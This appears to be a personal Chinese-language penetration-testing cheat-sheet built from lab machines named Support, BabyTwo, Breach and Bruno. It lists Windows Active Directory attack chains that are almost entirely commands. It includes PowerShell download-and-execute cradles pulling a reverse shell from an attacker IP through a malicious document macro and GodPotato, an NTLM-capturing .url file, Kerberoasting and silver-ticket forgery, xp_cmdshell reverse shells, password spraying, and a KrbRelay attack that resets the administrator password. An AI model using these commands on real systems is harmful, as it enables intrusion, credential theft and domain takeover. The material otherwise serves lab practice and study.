## Windows

### 不同局域网的传送https://file.io
```
[★]$ msfconsole //官方文件总是消失的命令
```
```
[★]$ nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success //同行配对--no-bruteforce
```
————————————————————————————————————
### 总结 一样命令的区别 form Job
#### PowerShell 反向 shell 文件
https://amanutkhedkar.medium.com/powershell-reverse-shell-via-social-engineering-toolkit-591ca034a12d
#### 第一条：让“受害文档里的宏代码”去执行 PowerShell
```
msf6 exploit(multi/misc/openoffice_document_macro) > set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.86/shell.txt');" 
```
#### 第二条：让“已经提权成功的 SYSTEM 进程（god.exe）”去执行 PowerShell
```
c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.txt');"
```
————————————————————————————————————
#### BloodHound form Support 
```
[★]$ sudo neo4j start
https://github.com/SpecterOps/BloodHound-Legacy/releases
[★]$ unzip BloodHound-linux-x64.zip

从远程收集数据在我们继续之前。为此，让我们继续在本地克隆BloodHound GitHub项目https://github.com/SpecterOps/BloodHound-Legacy
[★]$ git clone https://github.com/BloodHoundAD/BloodHound
[★]$ ls BloodHound/Collectors/
AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1

*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe
得到20260131001204_BloodHound.zip 
导入到 
[~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
```
————————————————————————————————————
#### About WriteDacl--PowerView.ps1 && GenericAll--pyGPOAbuse From BabyTwo
```
工具 revshells.com; 选择PowerShell #3(Base64);Base64 编码的 UTF-16LE PowerShell 脚本

$ bloodhound
//从 Windows 中滥用“写 DACL”访问控制列表:(WriteDacl 使用PowerView.ps1 )
//Amelia Griffiths -> MemberOf -> LEGACY@BABY2.VL -> WriteDacl -> GPOADM@BABY2.VL,GPO-MANAGEMENT@BABY2.VL
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
[★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1

// 通过组策略对象来滥用通用所有访问控制列表（GenericAll ACL），请使用 pyGPOAbuse。
// GPOADM@BABY2.VL -> GenericAll -> 蓝色文档方块 2个
// GPOADM@BABY2.VL -> Contains -> GPO-MANAGEMENT@BABY2.VL -> Contains -> BABY2.VL -> GPLink -> 蓝色文档方块(GPO Fine Path: \\BABY2.VL\SYSVOL\BABY2.VL\POLICIES\{31B2340-016D-11D2-945F-00C04FB984F9}
https://github.com/Hackndo/pyGPOAbuse

PS C:\Users\amelia.griffiths> gpupdate
```
————————————————————————————————————
#### .url 快捷方式配置格式 From Breach
```
[★]$ cat kavi.url
[InternetShortcut] 					//[InternetShortcut]表示这是一个 Windows Internet Shortcut 配置文件，类似浏览器快捷方式
URL=asdasdas
WorkingDirectory=hehe 				//工作目录
IconFile=\\10.10.14.27\aasd\nc.ico 	//nc.ico 只是一个 图标文件名
IconIndex=1 						//指定图标文件中的第几个图标,格式完整
```
#### Kerberoastable Account
```
[★]$ bloodhound-python -d breach.vl -u 'julia.wong' -p 'Computer1' -dc 'BREACHDC.breach.vl'  -c all -ns 10.129.3.36 --dns-tcp
Kerberoastable Account 中文意思：可以进行 Kerberoasting 攻击的账户
[1]使用 Impacket 工具包中的 GetUserSPNs.py 脚本来执行 Kerberoasting 攻击，以获取此用户的 KRB5TGS 哈希值（Kerberos 第五版服务票据哈希）
[★]$ GetUserSPNs.py 'breach.vl/julia.wong:Computer1' -request  //得到VPN和svc_mssql_hash
[2]从 Bloodhound 中获取。在搜索栏中搜索“breach.vl”，然后导航至Node Info -> Object ID
以管理员用户身份进行身份冒充以访问 MSSQL 服务器,1433 上运行的 MSSQLSvc 服务
[3]生成svc_mssql 账户的 rc4 哈希值
[★]$ pypykatz crypto nt Trustno1
[4]使用 Impacket 中的 ticketer.py 脚本来创建一张银色门票，并以管理员用户的身份进行模拟
[★]$ ticketer.py -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.3.36 -domain breach.vl -user-id 500 Administrator
[*] Saving ticket in Administrator.ccache
[5]将创建的“Administrator.ccache”文件导出，并使用 Impacket 中的“mssqlclient.py”脚本对 MSSQL 服务器进行身份验证。
[★]$ export KRB5CCNAME=Administrator.ccache
[★]$ mssqlclient.py -k -no-pass -windows-auth breachdc.breach.vl
SQL (BREACH\Administrator  dbo@master)> 

另外刷新 Kerberos，[★]$ kdestroy
```
#### mssql 启用 xp_cmdshell 功能并在目标系统内执行命令
```
SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'show advanced options', 1; //开启 SQL Server 高级配置选项，1启用

SQL (BREACH\Administrator  dbo@master)> RECONFIGURE; //立即生效
SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; //从 SQL Server 直接执行 Windows 命令行命令，1启用

SQL (BREACH\Administrator  dbo@master)> RECONFIGURE; //立即生效
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'whoami'; //调用 Windows shell，执行系统命令

SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'powershell -exec bypass -enc <Base64Payload>'; //启动 PowerShell，-exec bypass绕过执行策略，-enc：Base64 编码命令
工具 revshells.com; 选择PowerShell #3(Base64);Base64 编码的 UTF-16LE PowerShell 脚本

PS C:\Windows\system32> whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  //可以冒充已经连接的客户端身份
[6]使用“GodPotato”来提升权限并获取以“nt”权限或“系统”身份的反弹shell，https://github.com/BeichenDream/GodPotato
PS C:\Windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc <Base64Payload>'
```
————————————————————————————————————
#### From Bruno
```
Step 1：创建机器账户（MAQ 利用）
./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
Step 2：找可用端口（用于 COM Relay） //到一个端口（10246），该端口允许 SYSTEM → 你监听的服务通信
./CheckPort.exe
Step 3：获取你机器账户的 SID
[System.Security.Principal.SecurityIdentifier]::new((([ADSI]"LDAP://CN=roguecomputer,CN=Computers,DC=bruno,DC=vl").objectSID).Value,0).Value
Step 4：枚举可利用 CLSID（DCOM 攻击面）
./GetCLSID.ps1
Import-Csv Windows_Server_2022_Datacenter\CLSIDs.csv | ForEach-Object { $entry = $_; try { $svc = Get-Service $entry.LocalService -ErrorAction Stop; if ($svc.Status -eq "Running") { try { [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($entry.CLSID.Trim("{}")))|Out-Null; "$($entry.LocalService) | $($entry.CLSID) | Activate OK" } catch { if ($_.Exception.Message -match "80070005") { $r = "Access Denied" } elseif ($_.Exception.Message -match "80040111") { $r = "Class Not Available" } elseif ($_.Exception.Message -match "80070422") { $r = "Service Disabled" } else { $r = "Failed" }; "$($entry.LocalService) | $($entry.CLSID) | $r" } } } catch {} }
关键点：CertSvc -> Certificate Service（证书服务）->可以被 SYSTEM 调用,支持 DCOM 激活 -> 且：Activate OK
Step 5：核心攻击（KrbRelay）
./KrbRelay.exe \
-spn ldap/brunodc.bruno.vl \
-clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 \
-rbcd S-1-5-21-...-5101 \
-ssl \
-port 10246 \
-reset-password administrator Lacure77#

工具：
[★]$ git clone https://github.com/Kevin-Robertson/Sharpmad.git //Sharpmad.csproj
[★]$ git clone https://github.com/cube0x0/KrbRelay.git //CheckPort.exe  && KrbRelay.exe  这个需要在Pwnbox上的目标windows机器编译不了，需要在本机生成.exe再上传
[★]$ wget https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1

PS C:\programdata> Expand-Archive sharpmad.zip //解压
PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
```
